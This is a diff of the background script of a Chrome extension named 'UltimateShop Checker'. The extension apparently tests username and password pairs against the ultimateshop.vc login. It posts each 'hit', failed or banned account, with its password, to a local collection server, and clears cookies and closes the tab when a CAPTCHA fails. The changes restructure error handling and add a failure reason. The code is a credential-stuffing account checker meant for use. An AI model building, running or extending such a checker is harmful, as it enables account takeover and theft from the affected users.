@@ -1,25 +1,30 @@
-// UltimateShop Checker - Background Service Worker
-console.log('UltimateShop Background: Service worker starting...');
+// UltimateShop Checker Background Script
+console.log('UltimateShop Background: Service worker loaded');
 
-// Service worker installation
+// Service worker lifecycle events
 self.addEventListener('install', (event) => {
     console.log('UltimateShop Background: Service worker installed');
-    self.skipWaiting();
 });
 
-// Service worker activation
 self.addEventListener('activate', (event) => {
     console.log('UltimateShop Background: Service worker activated');
-    event.waitUntil(self.clients.claim());
 });
 
-// Listen for messages from content script
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    console.log('UltimateShop Background: Received message:', message.type);
-    
-    try {
+self.addEventListener('error', (event) => {
+    console.error('UltimateShop Background: Service worker error:', event.error);
+});
+
+self.addEventListener('unhandledrejection', (event) => {
+    console.error('UltimateShop Background: Unhandled rejection:', event.reason);
+});
+
+// Main message listener
+try {
+    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+        console.log('UltimateShop Background: Received message:', message.type);
+        
         if (message.type === 'hit_detected') {
-            // Report successful login to server
+            // Report hit account to server
             fetch('http://localhost:5050/report-hit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -59,13 +64,14 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             });
             
         } else if (message.type === 'fail_detected') {
-            // Report failed login to server
+            // Report failed account to server
             fetch('http://localhost:5050/report-fail', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     username: message.username,
-                    password: message.password
+                    password: message.password,
+                    reason: message.reason || 'Login failed'
                 })
             }).then(response => {
                 if (response.ok) {
@@ -92,6 +98,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
                     });
                 }, 2000); // Wait 2 seconds before refresh
             });
+            
         } else if (message.type === 'banned_detected') {
             // Report banned account to server
             fetch('http://localhost:5050/report-banned', {
@@ -126,35 +133,26 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
                     });
                 }, 2000); // Wait 2 seconds before refresh
             });
-        } else if (message.type === 'clear_cookies_and_close') {
-            console.log('UltimateShop Background: Clearing cookies and closing tab due to CAPTCHA failure...');
             
-            // Clear all cookies for ultimateshop.vc
+        } else if (message.type === 'clear_cookies_and_close') {
+            // Clear cookies and close tab
             chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                 cookies.forEach(cookie => {
                     const url = `https://${cookie.domain}${cookie.path}`;
                     chrome.cookies.remove({ url, name: cookie.name });
                 });
-                console.log('Cleared all cookies for ultimateshop.vc');
+                console.log('Cleared cookies for ultimateshop.vc');
                 
-                // Close the current tab after clearing cookies
-                setTimeout(() => {
-                    chrome.tabs.remove(sender.tab.id, () => {
-                        console.log('Tab closed due to CAPTCHA failure:', sender.tab.id);
-                    });
-                }, 1000);
+                // Close the tab
+                chrome.tabs.remove(sender.tab.id, () => {
+                    console.log('Tab closed after cookie clear:', sender.tab.id);
+                });
             });
         }
-    } catch (error) {
-        console.error('UltimateShop Background: Error processing message:', error);
-    }
-});
-
-// Service worker error handling
-self.addEventListener('error', (event) => {
-    console.error('UltimateShop Background: Service worker error:', event.error);
-});
-
-self.addEventListener('unhandledrejection', (event) => {
-    console.error('UltimateShop Background: Unhandled promise rejection:', event.reason);
-});
+        
+        // Always send response
+        sendResponse({ status: 'received' });
+    });
+} catch (error) {
+    console.error('UltimateShop Background: Error in message listener:', error);
+}
